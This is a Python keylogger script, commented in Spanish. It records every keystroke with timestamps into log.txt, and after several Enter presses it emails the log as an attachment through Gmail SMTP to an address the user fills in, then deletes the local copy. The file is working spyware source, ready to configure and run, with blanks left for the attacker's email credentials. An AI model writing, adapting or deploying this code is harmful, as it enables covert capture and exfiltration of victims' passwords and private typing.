import sys
import datetime
import os
import decouple
import time
import pynput
from pynput.keyboard import Key, Listener
import smtplib
from decouple import config
import keyboard

import smtplib, ssl
import getpass

from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def email():
    username = "" #Aqui va la direccion del correo que envia el reporte (entre las comillas)
    password = "" #Aqui va la contraseña del correo (entre las comillas)
    
    destinatario = "" #Aqui va la direccion del correo que recibe el reporte 
    asunto="Archivo .txt"
    
    
    mensaje = MIMEMultipart("alternative") 
    mensaje["Subject"] = asunto
    mensaje["From"] = username
    mensaje["To"] = destinatario
    
    html = f"""
    <html>
    <body>
        Puedes cambiar este mensaje  {destinatario}<br>
        Puedes cambiar este mensaje<b>Puedes cambiar este mensaje</b> Puedes cambiar este mensaje
    </body>
    </html>
    """
  
    parte_html= MIMEText(html, "html")
 
    mensaje.attach(parte_html)

    archivo="log.txt"
    with open(archivo, "rb") as adjunto:
        contenido_adjunto = MIMEBase("application", "octet-stream")
        contenido_adjunto.set_payload(adjunto.read())
        encoders.encode_base64(contenido_adjunto)
        contenido_adjunto.add_header(
            "Content-Disposition",
            f"attachment; filename= {archivo}",
            )
        mensaje.attach(contenido_adjunto)
        mensaje_final = mensaje.as_string()
     
        context = ssl.create_default_context()
        
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(username,password)
            print("Sesión iniciada!")
            server.sendmail(username, destinatario, mensaje_final)
            print("Mensaje enviado correctamente")

count=0
keys=[]


def on_press(key):
    global keys,count

    if key == Key.enter:

        keys.append("\n")

        write_file(keys,count)
        keys=[]
        count+=1
        if count>8: #Aqui va la cantidad de veces que se presionara enter antes de enviar el reporte en este caso seria ¨8¨ (lo puedes cambiar)
            email()
            if os.path.exists("log.txt"):
                os.remove("log.txt")
            count=0


    elif key=='"':
        keys.append('"')
    elif key== Key.shift_r:
        keys.append("")
        
    elif key== Key.ctrl_l:
        keys.append("")

    elif key == Key.space:
        keys.append(" ")  

    elif key == Key.backspace:
        if len(keys)==0:
            pass
        else:
            keys.pop(-1)
            
    else:
        keys.append(key)

    print("{0}".format(key))
    
def write_file(keys,count):
    with open("log.txt", "a") as f:
        f.write(time.strftime("%d/%m/%y   "))
        f.write(time.strftime("%I:%M:%S   "))
        for key in keys:
            k=str(key).replace("'","")

            if k.find("\n")>0:
                f.write(k)
       
            elif k.find('Key')== -1:
                f.write(k)
            
        
def on_release(key):
    
    if key == Key.esc:
        return False
    
def main():
    if os.path.exists("log.txt"):
        os.remove("log.txt")
    else:  
        pass
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
if __name__== '__main__':
    main()

